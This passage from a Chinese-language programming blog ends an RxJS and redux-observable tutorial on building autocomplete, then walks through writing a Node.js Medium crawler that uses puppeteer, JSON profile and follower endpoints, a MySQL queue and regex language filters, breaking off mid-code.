第一個問題，現在只要每打一個字就會送出一個 request，可是這樣做其實有點浪費，因為使用者可能快速的輸入了：java想要找相關的資料，他根本不在乎j、ja、jav這三個 request。 要怎麼做呢？我們就改寫成如果 250ms 裡面沒有再輸入新的東西才發送 request 就好，就可以避免這種多餘的浪費。 這種技巧稱作debounce，實作上也很簡單，就是利用setTimeout跟clearTimeout。 1234567891011var timer = null;document.querySelector('.auto-complete input').addEventListener('input', (e) =&gt; &#123; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(() =&gt; &#123; searchWikipedia(e.target.value).then((data) =&gt; &#123; renderList(data[1]) &#125;) &#125;, 250)&#125;) 在 input 事件被觸發之後，我們不直接做事情，而是設置了一個 250ms 過後會觸發的 timer，如果 250ms 內 input 再次被觸發的話，我們就把上次的 timer 清掉，再重新設置一個。 如此一來，就可以保證使用者如果在短時間內不斷輸入文字的話，不會送出相對應的 request，而是會等到最後一個字打完之後的 250 ms 才發出 request。 解決了第一個問題之後，還有一個潛在的問題需要解決。 假設我現在輸入a，接著刪除然後再輸入b，所以第一個 request 會是a的結果，第二個 request 會是b的結果。我們假設 server 出了一點問題，所以第二個的 response 反而比第一個還先到達（可能b的搜尋結果有 cache 但是a沒有），這時候就會先顯示b的內容，等到第一個 response 回來時，再顯示a的內容。 可是這樣 UI 就有問題了，我明明輸入的是b，怎麼 auto complete 的推薦關鍵字是a開頭？ 所以我們必須要做個檢查，檢查返回的資料跟我現在輸入的資料是不是一致，如果一致的話才 render： 12345678910111213var timer = null;document.querySelector('.auto-complete input').addEventListener('input', (e) =&gt; &#123; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(() =&gt; &#123; searchWikipedia(e.target.value).then((data) =&gt; &#123; if (data[0] === document.querySelector('.auto-complete input').value) &#123; renderList(data[1]) &#125; &#125;) &#125;, 250)&#125;) 到這裡應該就差不多了，該有的功能都有了。 接著，讓我們來挑戰用 RxJS 實作吧！ 首先，先從簡單版的開始做，就是不包含 debounce 跟上面 API 順序問題的實作，監聽 input 事件轉換成 request，然後用flatMap壓平，其實就跟上面的流程差不多： 123456789Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .map(e =&gt; e.target.value) .flatMap(value =&gt; &#123; return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1]) &#125;) .subscribe(value =&gt; &#123; renderList(value); &#125;) 這邊用了兩個map，一個是把e轉成e.target.value，一個是把傳回來的結果轉成res[1]，因為我們只需要關鍵字列表，其他的東西其實都不用。 那要如何實作debounce的功能呢？ RxJS 已經幫你實作好了，所以你只要加上.debounceTime(250)就好了，就是這麼簡單。 12345678910Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .debounceTime(250) .map(e =&gt; e.target.value) .flatMap(value =&gt; &#123; return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1]) &#125;) .subscribe(value =&gt; &#123; renderList(value); &#125;) 還有最後一個問題要解決，那就是剛才提到的 request 的順序問題。 Observable 有一個不同的解法，我來解釋給大家聽聽。 其實除了flatMap以外，還有另外一種方式叫做switchMap，他們的差別在於要怎麼把 Observable 給壓平。前者我們之前介紹過了，就是會把每一個二維的 Observable 都壓平，並且「每一個都執行」。 而switchMap的差別在於，他永遠只會處理最後一個 Observable。拿我們的例子來說，假設第一個 request 還沒回來的時候，第二個 request 就發出去了，那我們的 Observable 就只會處理第二個 request，而不管第一個。 第一個還是會發送，還是會接收到資料，只是接收到資料以後不會再把這個資料 emit 到 Observable 上面，意思就是根本沒人理這個資料了。 可以看一下簡陋的圖解，flatMap每一個 promise resolve 之後的資料都會被發送到我們的 Observable 上面： 而switchMap只會處理最後一個： 所以我們只要把flatMap改成switchMap，就可以永遠只關注最後一個發送的 request，不用去管 request 傳回來的順序，因為前面的 request 都跟這個 Observable 無關了。 12345678910Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .debounceTime(250) .map(e =&gt; e.target.value) .switchMap(value =&gt; &#123; return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1]) &#125;) .subscribe(value =&gt; &#123; renderList(value); &#125;) 做到這邊，就跟剛剛實作的功能一模一樣了。 但其實還有地方可以改進，我們來做個小小的加強好了。現在的話當我輸入abc，會出現abc的相關關鍵字，接著我把abc全部刪掉，讓 input 變成空白，會發現 API 這時候回傳一個錯誤：The &quot;search&quot; parameter must be set.。 因此，我們可以在 input 是空的時候，不發送 request，只回傳一個空陣列，而回傳空陣列這件事情可以用Rx.Observable.of([])來完成，這樣會創造一個會發送空陣列的 Observable： 12345678910Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .debounceTime(250) .map(e =&gt; e.target.value) .switchMap(value =&gt; &#123; return value.length &lt; 1 ? Rx.Observable.of([]) : Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1]) &#125;) .subscribe(value =&gt; &#123; renderList(value); &#125;) 還有一個點擊關鍵字清單之後把文字設定成關鍵字的功能，在這邊就不示範給大家看了，但其實就是再創造一個 Observable 去監聽點擊事件，點到的時候就設定文字並且把關鍵字清單給清掉。 我直接附上參考程式碼： 12345678Rx.Observable .fromEvent(document.querySelector('.auto-complete__list'), 'click') .filter(e =&gt; e.target.matches('li')) .map(e =&gt; e.target.innerHTML) .subscribe(value =&gt; &#123; document.querySelector('.auto-complete input').value = value; renderList([]) &#125;) 雖然我只介紹了最基本的操作，但 RxJS 的強大之處就在於除了這些，你甚至還有retry可以用，只要輕鬆加上這個，就能夠有自動重試的功能。 相關的應用場景還有很多，只要是跟 API 有關連的幾乎都可以用 RxJS 很優雅的解決。 React + Redux 的非同步解決方案：redux-observable 這是我們今天的最後一個主題了，也是我開場所提到的。 React + Redux 這一套非常常見的組合，一直都有一個問題存在，那就是沒有規範非同步行為（例如說 API）到底應該怎麼處理。而開源社群也有許多不同的解決方案，例如說 redux-thunk、redux-promise、redux-saga 等等。 我們前面講了這麼多東西，舉了這麼多範例，就是要證明給大家看 Reactive programming 很適合拿來解決複雜的非同步問題。因此，Netflix 就開源了這套redux-observable，用 RxJS 來處理非同步行為。 在瞭解 RxJS 之後，可以很輕鬆的理解redux-observable的原理。 在 redux 的應用裡面，所有的 action 都會通過 middleware，你可以在這邊對 action 做任何處理。或者我們也可以把 action 看做是一個 Observable，例如說： 12345// 範例而已Rx.Observable.from(actionStreams) .subscribe(action =&gt; &#123; console.log(action.type, action.payload) &#125;) 有了這個以後，我們就可以做一些很有趣的事情，例如說偵測到某個 action 的時候，我們就發送 request，並且把 response 放進另外一個 action 裡面送出去。 1234567891011Rx.Observable.from(actionStreams) .filter(action =&gt; action.type === 'GET_USER_INFO') .switchMap( action =&gt; Rx.Observable.from(API.getUserInfo(action.payload.userId)) ) .subscribe(userInfo =&gt; &#123; dispatch(&#123; type: 'SET_USER_INFO', payload: userInfo &#125;) &#125;) 上面就是一個簡單的例子，但其實redux-observable已經幫我們處理掉很多東西了，所以我們只要記得一個概念： action in, action out redux-observable 是一個 middleware，你可以在裡面加上很多epic，每一個epic就是一個 Observable，你可以監聽某一個指定的 action，做一些處理，再轉成另外一個 action。 直接看程式碼會比較好懂： 12345678import Actions from './actions/user';import ActionTypes from './actionTypes/user'const getUserEpic = action$ =&gt; action$.ofType(actionTypes.GET_USER) .switchMap( action =&gt; Rx.Observable.from(API.getUserInfo(action.payload.userId)) ).map(userInfo =&gt; Actions.setUsers(userInfo)) 大概就是像這樣，我們監聽一個 action type（GET_USER），一接收到的時候就發送 request，並且把結果轉為setUsers這個 action，這就是所謂的 action in, action out。 這樣的好處是什麼？好處是明確制定了一個規範，當你的 component 需要資料的時候，就送出一個 get 的 action，這個 action 經過 middleware 的時候會觸發 epic，epic 發 request 給 server 拿資料，轉成另外一個 set 的 action，經過 reducer 設定資料以後更新到 component 的 props。 可以看這張流程圖： 總之呢，epic就是一個 Observable，你只要確保你最後回傳的東西是一個 action 就好，那個 action 就會被送到 reducer 去。 礙於篇幅的關係，今天對於redux-observable只是概念性的帶過去而已，沒有時間好好示範，之後再來找個時間好好寫一下redux-observable的實戰應用。 結論 從一開始的陣列講到 Observable，講到畫圖的範例再講到經典的 Auto Complete，最後還講了redux-observable，這一路的過程中，希望大家有體會到 Observable 在處理非同步行為的強大之處以及簡潔。 這篇的目的是希望能讓大家理解 Observable 大概在做什麼，以及介紹一些簡單的應用場景，希望能提供一篇簡單易懂的中文入門文章，讓更多人能體會到 Observable 的威力。 喜歡這篇的話可以幫忙分享出去，發現哪邊有寫錯也歡迎留言指正，感謝。 參考資料： 30 天精通 RxJS (01)：認識 RxJS Reactive Programming 簡介與教學(以 RxJS 為例) The introduction to Reactive Programming you’ve been missing 构建流式应用—RxJS详解 Epic Middleware in Redux Combining multiple Http streams with RxJS Observables in Angular2 影片： Netflix JavaScript Talks - RxJS + Redux + React = Amazing! RxJS Quick Start with Practical Examples RxJS Observables Crash Course Netflix JavaScript Talks - RxJS Version 5 RxJS 5 Thinking Reactively | Ben Lesh","link":"/2017/12/08/introduction-to-rxjs-observable/"},{"title":"Medium 爬蟲進化史","text":"前言 前幾天的時候我在 Medium 上發了這篇文：Medium 中文寫作者追蹤人數排名與不專業數據分析，內文是我用 Node.js 寫了一個簡單的 Medium 爬蟲之後整理出來的數據。 在原本那篇文章裡面有簡單提到爬蟲的資料來源，但是對技術的部分沒有太多著墨。事實上，在寫 Medium 爬蟲的時候其實踩了一些坑，與其教大家寫一個 Medium 爬蟲，不如讓大家跟我一起走過這些坑，盡可能地還原我當初在寫這個爬蟲時碰到的障礙以及解決方法，我覺得這樣會更有趣一點。 因此，這篇就是用來記錄我寫這個 Medium 爬蟲的經過，其中也會有點教學的成份在，所以看完之後你應該也能夠寫出一個類似的爬蟲，或至少你看到 source code 的時候不會一頭霧水。 雖然說最後寫出來的是這個跟使用者資料有關的爬蟲，但我一開始其實是先從文章列表開始的，因為那時候剛好有一個需求，想要把自己的文章全部爬下來。 會有這個需求是因為 Medium 內建的功能其實滿爛的，你很難找到一個作者 po 過的所有文章，或者是說很難一目瞭然。所以早期的文章除了透過 Google 以外，是很難被找到的。 所以我後來就手動做了一個文章的索引，自己整理了以前發過的所有文章。但是身為工程師，這明明就是一件可以寫程式來做的事啊！所以想嘗試看看能不能先寫一個文章列表的爬蟲。 第一次嘗試：尋找資料來源 對我來說，爬蟲的第一步也是最困難的一步就是找到資料來源。只要這一步完成了，其他的相比之下都比較簡單。 如果能拿到 Medium 的 API 那當然是最好的。若是沒有的話，就必須用 puppeteer 之類的東西去爬 HTML 然後自己 parse 了。 在 Medium 的文章列表那邊捲動一下並且打開 devtool，可以看到 medium 後面是用 GraphQL： 這個就麻煩了…我對 GraphQL 不太熟，要花時間去研究一下它的資料結構，感覺要花不少時間，於是那時我就暫時先放棄這條路，決定來試試看用 puppeteer。 第二次嘗試：puppeteer 如果你不知道什麼是 puppeteer，我在這邊簡單介紹一下。你可以想成 puppeteer 會自動幫你打開一個瀏覽器，你可以寫程式去操控這個瀏覽器。例如說我要打開一個頁面並且在這頁面上執行 JS 等等，所以使用 puppeteer 的話，爬蟲的原理就是打開某個頁面，執行一段 JS 拿到頁面上的資料。 puppeteer 用起來很簡單，只要找一下現成的範例看一下語法，改一改就可以直接拿來用了。稍微研究了一下 HTML 結構之後，可以寫出下面的程式碼： 12345678910111213141516171819202122232425262728293031323334353637383940414243const puppeteer = require('puppeteer') async function main() &#123; const username = 'hulitw' const url = 'https://medium.com/@' + username const browser = await puppeteer.launch(&#123; headless: true &#125;) // 造訪頁面 const page = await browser.newPage() await page.goto(url, &#123; waitUntil: 'domcontentloaded' &#125;) // 執行準備好的 script 並回傳資料 const data = await page.evaluate(mediumParser) console.log(data) await page.close() await browser.close()&#125; function mediumParser() &#123; // selector 是透過觀察而得來的 const elements = document.querySelectorAll('section &gt; div:nth-child(2) &gt; div &gt; div') const result = [] for (let i = 0; i &lt; elements.length; i++) &#123; const h1 = elements[i].querySelector('h1') const a = elements[i].querySelectorAll('a') if (h1) &#123; result.push(&#123; title: h1.innerText, link: a[3].href &#125;) &#125; &#125; return result&#125; main() 只要觀察出 HTML 與 CSS 的規則之後，就可以取得想拿的資料。但 Medium 不好爬是因為在 class name 的部分有使用 functional CSS，而且 class 的命名都有經過處理，看起來是用程式自動去跑的，所以只要 Medium 一更新，元素的命名應該會不太一樣。 所以最後只能從 HTML 的結構下手，去把文章給抓出來。 解決了這個問題之後，還有一個問題，那就是無限捲動。Medium 跟很多網頁一樣，要一直往下滑才會載入新文章，而這邊必須觀察的規律是滑到什麼時候才要停止。 觀察之後發現當發表過的文章載入完以後，才會顯示 Highlighted by xxx 這個區塊，所以可以用這個元素有沒有出現當作終止條件。 接著可以寫一段程式碼，讓頁面不斷往下捲動直到載入所有文章為止： 123456789101112131415161718192021222324252627/* 要用的話就是： await scroll(page)*/ function getArticlesCount() &#123; const elements = document.querySelectorAll('section &gt; div:nth-child(2) &gt; div &gt; div') return elements.length&#125; async function scroll(page) &#123; await page.evaluate('window.scrollTo(0, document.body.scrollHeight)') try &#123; // 終止條件 await page.waitForSelector('h4 ~ p', &#123; timeout: 1000 &#125;) &#125; catch(err) &#123; // 印出目前抓到的文章數目 const count = await page.evaluate(getArticlesCount); console.log(`Fetching... $&#123;count&#125; articles`) // 繼續往下捲動 await scroll(page); &#125;&#125; 為了在 console 上讓我能看到現在的進度（可以確認程式是不是有 bug），還加了一段是每一次捲動都會印出現在畫面上有的文章數量。 做到這邊，就可以抓到使用者所有的文章標題以及連結了。 那發文日期呢？也拿得到嗎？ 拿得到，但是麻煩很多。看看下面的 Medium 截圖就知道了： 如果是今年（2019）的文章，就不會顯示年份，否則的話就會顯示出發文年份。所以這邊要再經過特殊的判斷處理，而且只拿得到日期，拿不到詳細發文時間。 做到這邊，我就懶得再繼續下去了。想說有很多眉眉角角要處理，而且抓到的資料有限，還不如轉去研究 API 比較實在。 第三次嘗試：puppeteer + API 前面已經說過我那時對 GraphQL API 不熟，所以暫時放棄了。但是嘗試了 puppeteer 之後，反而讓我有了新的思路。 在 puppeteer 裡面你可以加上監聽 network response 的事件，而頁面在載入文章的時候，一定會呼叫 API 去拿文章。這樣子事情不就好辦多了嗎？我不用自己研究怎麼 call API，我讓頁面自己去 call API，我自己只要監聽 response，研究一下 response 的格式就行了！ 程式碼大概是長這樣的： 123456789101112131415161718192021222324252627const apiResponses = [] page.on('response', async (response) =&gt; &#123; if (response._url.indexOf('graphql') &lt; 0) return const json = await response.json() try &#123; const post = parsePosts(json) apiResponses.push(...post) &#125; catch (err) &#123; &#125;&#125;) function parsePosts(json) &#123; const result = [] try &#123; // 研究到一半沒做完 const streams = json.data.user.profileStreamConnection.stream for (stream of streams) &#123; if (stream.itemType.__typename === 'StreamItemCompressedPostList') &#123; &#125; &#125; &#125; catch (err) &#123; &#125;&#125; 每次有新的 response 進來就可以解析一下並丟到 array 裡面，最後拿到的就會是完整的從 API 傳來的資料。 但後來我發現這條路也行不通。 為什麼呢？因為頁面在第一次載入的時候，從 Server 回傳的 HTML 就已經有前幾筆文章的資料了，往下捲動的時候才是使用 ajax 來載入新的文章。意思是說，如果我想靠監聽 ajax response 的方式拿到所有文章的資料是沒辦法的，前幾筆是拿不到的。 做到這邊的時候我有點心灰意冷，想說花了兩天寫出一個不能用的東西。抓取文章列表的部分做到這我就放棄了，懶得繼續花時間去研究，並且把心力轉向我真正想抓的東西。 最前面提到的抓文章列表的需求其實是突然蹦出來的，在這之前我有更想抓的東西：follower，我想統計臺灣寫作者的 follower 人數，然後看看自己可以排到第幾名（滿足一下虛榮心）。 在嘗試了抓文章列表並失敗以後，我有試過用類似的方式去抓 follower，但做到一半發現這樣抓的話效率也太差了，每次捲動載入 25 個 follower 的話，1000 人可是要捲動 40 次。 自己如果做不出來的話，答案就很明顯了：Google，就拜託你了！ 第四次嘗試：Google 大神 直接在 Google 打上關鍵字：medium follower api，出現的第一個搜尋結果是最無用的官方 API，幾乎什麼資料都沒給，而且要申請還要寄信給客服，有夠麻煩。 但是第二個搜尋結果讓我眼睛為之一亮，是一個 gist 檔案：Medium API: get number of followers for User · GitHub。 程式碼才五十行而已，很短，掃過一遍可以看到最關鍵的一行： 1234// BUILD THE URL TO REQUEST FROMfunction generateMediumProfileUri(username) &#123; return `https://medium.com/@$&#123;username&#125;?format=json`;&#125; 什麼！原來還有這招，在網址後面加 ?format=json 就可以拿到 json 格式的資料，這真是太神奇了。 把得到的資料丟到 JSON Formatter 之後，可以看到大概的結構： 在這邊可以拿到使用者的個人資料以及發過的一些文章，也可以拿到我們的目標：follower！ 我們順便來看一下使用者資料可以拿到些什麼： 123456789101112131415\"user\":&#123; \"userId\":\"f1fb3e40dc37\", \"name\":\"Huli\", \"username\":\"hulitw\", \"createdAt\":1487549030919, \"imageId\":\"1*WQyJUJBQpBNIHH8GEWE6Sg.jpeg\", \"backgroundImageId\":\"\", \"bio\":\"自學程式，後來跑去唸哲學系但沒念完，前往新加坡工作了兩年半後決定放一年的假，到處旅遊。喜歡教學，發現自己好像有把事情講得簡單又清楚的能力，相信分享與交流可以讓世界更美好。\\bMedium 文章列表請參考：https://aszx87410.github.io/blog/medium\", \"allowNotes\":1, \"mediumMemberAt\":1542441600000, \"isNsfw\":false, \"isWriterProgramEnrolled\":true, \"isQuarantined\":false, \"type\":\"User\"&#125; 除了基本的自介跟姓名以外，還可以拿到成為 Medium 付費會員的時間以及成為 Medium 會員的時間，還滿有趣的，還有一個 flag 也很有趣：isNsfw。 唯一缺的就是 follower 的清單了。 這邊我嘗試用一樣的方法，在 Medium 網址後面接了參數：https://medium.com/@hulitw/followers?format=json，沒想到還真的有東西！在 response 裡面可以找到 10 個 follower 的資料。 有了資料之後就確定這個 API 是有用的，再來直接跳到 response 最下面 paging 的部分： 123456789\"paging\":&#123; \"path\":\"https://medium.com/_/api/users/f1fb3e40dc37/profile/stream\", \"next\":&#123; \"limit\":10, \"to\":\"10590c54e527\", \"source\":\"followers\", \"page\":2 &#125;&#125; path 的部分看起來是個 API 網址，next 應該是參數，試著把這些參數帶到網址上面：https://medium.com/_/api/users/f1fb3e40dc37/profile/stream?limit=10&amp;to=10590c54e527&amp;source=followers&amp;page=2 ，就出現了只有 follower 相關的資料！ 試著把 limit 換一下，發現最大值應該是 25，一次可以抓 25 筆資料；page 換一下之後發現沒什麼作用，於是把 to 也改一下，發現可以成功抓到新的資料。看來分頁機制是採用 cursor based 的。 在經過了幾次嘗試之後，終於拿到了兩個 API 的網址，一個可以獲得詳細個人資料，另外一個可以拿到 follower 的列表！ 資料來源確定有了之後，就可以來構思一下爬蟲的架構了。 爬蟲架構 我要怎麼樣才能儘可能爬到所有的台灣寫作者？ 首先第一個問題是我們必須把範圍放大一點，因為中文寫作者裡面可能有香港來的或是中國來的，你比較難靠程式去辨別到底是哪裡來的，尤其是香港跟台灣，因為都使用繁體中文。 為了不讓問題變得更複雜，我們只要能抓到「中文使用者就好」。 那要怎麼樣才能抓到最多中文使用者？一個很簡單的策略就是我們預設中文使用者的 follower 應該都是中文使用者，所以我們只要從某個使用者開始，把他所有的 follower 都丟進一個 queue 裡面，一直持續這個動作就好。 用文字簡化就是這樣： 從 queue 裡面拿出一個使用者 把他的資料寫進資料庫 把他的所有 follower 丟進 queue 回到步驟一 這樣子就可以靠著一個使用者無限延伸出去，而且理論上來說可以抓到超級多使用者的資料。這邊之所有選擇 follower（追蹤我的人）而不是 following（我追蹤的人），是考量到追蹤的使用者可能會有別的國家的，例如說我可能會追蹤國外的工程師之類的，但因為我不寫英文，所以國外的工程師應該不會來追蹤我。這樣的話就可以讓使用者侷限在中文，符合我們的目標。 接著就是系統架構的部分，這邊依據你想達成的效率會有不同種做法。 對我來說效率會最高的就是找那種很適合用來當 queue 的 service，例如說 redis 之類的，然後資料庫的部分可以選用 MySQL 或任何你熟悉的軟體。這樣子的好處是你可以開不同機器，然後每一台機器都是一個 worker，例如說你開五台機器，就會有五個 worker 一直從 queue 裡面拿東西出來並且把 follower 丟進去。 這邊之所以開很多台機器而不是開很多 thread 或 process，是因為 rate limiting 的問題。一般 API 都會有流量限制，你如果同一個 IP 發太多 request 會被 ban 掉或者是一段時間拿不到 response，所以開再多 process 跟 thread 都沒有用，只能開不同機器來解決（或只要有辦法換 IP 的話就可以）。 後來因為我沒有很在乎效率而且懶得開很多機器，所以只打算開一台讓他慢慢抓。如果只有一個 worker 的話，queue 的部分也可以簡單做一下，這邊我就也用 MySQL 來實做簡單的 queue，讓整個爬蟲的架構變得很簡單。 我們可以來看一下資料庫的架構： Users id userId username name bio follower fr mediumMemberAt createdAt 自增ID 使用者 ID 前面加上 @ 就是 profile 網址 使用者名稱 自介 追蹤人數 分類 成為付費會員的時間 加入會員的時間 Queue id userId 自增ID 使用者 ID 程式的執行流程是這樣的： 從 Queue 裡面拿出一個 userId 如果 userId 已存在 Users，回到步驟一 把他的資料寫進 Users 把他的所有 follower 丟進 Queue 回到步驟一 從 queue 拿出來的時候先確保沒有爬過這個使用者，有的話就跳過，然後把所有追蹤者再丟到 queue 裡面，這樣程式就會一直跑，直到 queue 裡面沒有東西為止。 架構設計好之後，就可以來開始 coding 啦！ 第一版爬蟲 首先我們需要有一個 queue，能夠 push 跟 pop，還要能確定現在拿的 userId 是不是已經爬過了。這個很適合用 class 來實作： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758class Queue &#123; constructor(conn) &#123; this.conn = conn &#125; get() &#123; return new Promise((resolve, reject) =&gt; &#123; this.conn.query('SELECT userId from Queues limit 1', (error, results) =&gt; &#123; if (error) &#123; console.log(error) return reject(error) &#125; if (results.length !== 1) &#123; return resolve(null) &#125; const data = results[0] this.conn.query('DELETE from Queues where userId=?', [data.userId], (err, results) =&gt; &#123; if (error) &#123; console.log(error) return reject(error) &#125; return resolve(data.userId) &#125;) &#125;); &#125;) &#125; check(uid) &#123; return new Promise((resolve, reject) =&gt; &#123; this.conn.query('SELECT userId from Users where userId=?', [uid], function (error, results) &#123; if (error) &#123; return reject(error) &#125; if (results.length &gt; 0) &#123; return resolve(false) &#125; return resolve(true) &#125;); &#125;) &#125; push(list) &#123; return new Promise((resolve, reject) =&gt; &#123; const values = [] for (let item of list) &#123; values.push([item]) &#125; this.conn.query(` INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) =&gt; &#123; if (err) &#123; // console.log(err) &#125; resolve() &#125; ) &#125;) &#125;&#125; 有了 queue 以後可以來寫主要邏輯，主程式的架構會長這樣： 123456789101112131415161718192021222324252627282930var connection = mysql.createPool(&#123; connectionLimit : 10, host : process.env.host, user : '', password : '', database : 'medium', charset: 'utf8mb4'&#125;)async function main() &#123; const queue = new Queue(connection) // 不斷從 queue 拿東西出來 while(true) &#123; const userId = await queue.get() if (!userId) &#123; console.log('no data from queue, end') break; &#125; // 看看是否已經爬過，爬過就跳掉 const check = await queue.check(userId) if (!check) &#123; continue &#125; // 拿 userId 做你想做的事 console.log('uid:', userId) &#125;&#125; 接著只要實作以下兩個功能就好： 抓取使用者資料 把使用者資料寫進資料庫 把 follower 丟回 queue 由於 Medium API 的 response 都會有一個防 json hijacking 的開頭，因此我們可以包裝一個函式專門來 parse API 的 response： 123456789async function getMediumResponse(url) &#123; try &#123; const response = await axios.get(url) const json = JSON.parse(response.data.replace('])&#125;while(1);&lt;/x&gt;', '')) return json &#125; catch(err) &#123; return null &#125; &#125; 接著就可以寫兩個 function，一個抓使用者資料，一個抓 follower 資料（有出現 _ 的都是 lodash 的 function）： 12345678910111213141516171819202122232425262728293031323334353637async function getUserInfo(uid) &#123; const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream` const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const userId = _.get(json, 'payload.user.userId') const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0) return &#123; followerCount: follower, userId: userId, name: _.get(json, 'payload.user.name'), username: _.get(json, 'payload.user.username'), bio: _.get(json, 'payload.user.bio'), mediumMemberAt: _.get(json, 'payload.user.mediumMemberAt'), isWriterProgramEnrolled: _.get(json, 'payload.user.isWriterProgramEnrolled'), createdAt: _.get(json, 'payload.user.createdAt'), &#125;&#125;async function getFollowers(uid, to) &#123; let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200` if (to) &#123; url += '&amp;to=' + to &#125; const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const followers = _.keys(json.payload.references.Social) || [] const nextTo = _.get(json, 'payload.paging.next.to') return &#123; followers, nextTo &#125;&#125; 基本上都是 call API 之後稍微處理一下資料，然後把我們關注的東西傳回去。 上面我們只實做了「抓一次 follower」的 function，所以最後還要再實作一個「抓全部 follower 並且丟進 queue」的 function： 123456789101112131415161718async function getAllFollowers(uid, queue) &#123; const followers = [] let to = undefined while (true) &#123; const data = await getFollowers(uid, to) if (!data) &#123; break; &#125; followers.push(...data.followers) to = data.nextTo console.log(uid, 'fetching...', followers.length) if (data.followers.length === 0 || !to) &#123; break; &#125; await queue.push(data.followers) &#125; return followers&#125; 這個函式會不斷去抓 follower 出來並丟進 queue，並且印出現在總共抓了幾筆 follower 的資料，全部抓完會把所有的 follower 回傳回去（會回傳是因為一開始我是全部抓完才一次寫進 queue，但後來發現比較沒效率，所以改成現在這樣抓一次就寫一次）。 最後是把使用者資料寫進去資料庫的程式碼： 123456789101112131415161718192021function format(time) &#123; if (!time) return null return moment(time).format('YYYY-MM-DD HH:mm:ss')&#125; function saveUserInfo(conn, info) &#123; conn.query(` INSERT INTO Users ( userId, username, name, bio, follower, mediumMemberAt, createdAt, isWriterProgramEnrolled ) VALUES ?`, [[[ info.userId, info.username, info.name, info.bio, info.followerCount, format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled ]]], (err) =&gt; &#123; if (err) &#123; // console.log(err) &#125; &#125; )&#125; 把這幾個核心功能的 function 寫完以後，只要修正一下我們的主程式，就可以把整個爬蟲完成了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344async function main() &#123; const queue = new Queue(connection) while(true) &#123; // 1. 從 Queue 裡面拿出一個 userId const userId = await queue.get() if (!userId) &#123; console.log('no data from queue, end') break; &#125; // 2. 如果 userId 已存在 Users，回到步驟一 const check = await queue.check(userId) if (!check) &#123; continue &#125; console.log('uid:', userId) try &#123; const info = await getUserInfo(userId) // 如果沒抓到資料有可能是被擋了，先停個 3 秒 if (!info.userId) &#123; console.log('sleep...') await sleep(3000) &#125; // 3. 把他的資料寫進 Users saveUserInfo(connection, info) // 4. 把他的所有 follower 丟進 Queue if (info.followerCount &gt; 0) &#123; // 把 followers 放到 queue 並印出總共幾筆資料 const followerList = await getAllFollowers(userId, queue) console.log('Add ' + followerList.length + ' into queue.') &#125; &#125; catch(err) &#123; // 有錯誤就先睡個 3 秒 console.log('error...sleep') await sleep(3000) &#125; &#125; &#125; 上面就是我們按照先前的邏輯寫出來的程式碼： 從 Queue 裡面拿出一個 userId 如果 userId 已存在 Users，回到步驟一 把他的資料寫進 Users 把他的所有 follower 丟進 Queue 回到步驟一 不過這邊額外加了一個邏輯是當呼叫 API 有問題的時候，就先暫停 3 秒鐘，這樣是為了防止被 rate limiting 擋到。但這個機制做的不是很好，因為沒有 retry，所以一但發生錯誤，這個 userId 就被跳過了。 當初的想法是只跳過一個 userId 無傷大雅，畢竟 queue 裡面可能有十萬筆的 userId，而且就算跳過，之後還是有可能再被丟到 queue 裡面，所以不做 retry 的機制也無所謂。 上面的程式碼全部組裝起來，就是第一版爬蟲的雛形了。運作的 ok 沒什麼問題，就只是速度比較慢而已。而且 queue 增長的速度比想像中驚人，我跑了一個晚上 queue 大概就多了十萬筆資料，而 users 裡面卻只有四五千筆而已。 不過在跑了一個晚上之後，我發現了一個致命的錯誤。 第二版爬蟲：判斷中文 這個致命的錯誤就是當初的預設：「中文作者的 follower 都是中文作者」是有問題的，而且仔細想想會發現這個預設的確很不可靠。 所以跑了一個晚上的爬蟲，我發現資料庫裡面多了一大堆外國使用者。而且一但多了一個，你的 queue 裡面就會出現一大堆的外國使用者。 為了避免這個情形，我決定從自介跟暱稱下手，寫一個判斷自介跟暱稱是否含有中文的函式，如果有中文才被放進來。這邊我直接複製在 Stack Overflow 上找到的程式碼，看起來十分神奇： 12345function isChinese(text = '') &#123; // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287 const regex = /(\\p&#123;Script=Hani&#125;)+/gu; return text.match(regex)&#125; 在 queue 裡面抓完使用者資料後會進行判斷： 123456const info = await getUserInfo(userId) // 非中文，直接略過if (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123; continue;&#125; 做這個判斷的時候我就已經想到會有一個問題，那就是有些人他們喜歡國際化一點，在自介會放全英文，暱稱也會是英文，所以會被誤判。明明就是用中文寫作，但是卻沒有被加進 queue 裡面。 這邊我當時覺得無所謂，畢竟這樣的人不多，而且要解的話有點麻煩。當時我腦中本來就有浮現一個解法，就是去抓他最近拍手過或發表過的文章，看看標題是不是中文，這樣的判斷會準確很多。但當時我懶得實作，想說先讓爬蟲繼續跑一天看看。 隔天早上，又發現了一個完全沒想過會碰到的問題。 第三版爬蟲：判斷日文 使用者清單裡面出現一大堆日本人。 因為他們有些暱稱是漢字，要嘛就是自介有漢字，所以不會被中文判斷篩掉。發現這個問題的時候我第一個想法是：「如果這是在面試我一定被刷掉，這種 case 居然當初沒想到…」。 為了解決這種情況，就再找了一個判斷是不是有日文（不含漢字）的正則表達式： 123456789function isJapanese(text = '') &#123; // @see: https://gist.github.com/ryanmcgrath/982242 const regexJP = /[\\u3040-\\u309F]|[\\u30A0-\\u30FF]/g; const jp = text.match(regexJP) if (jp 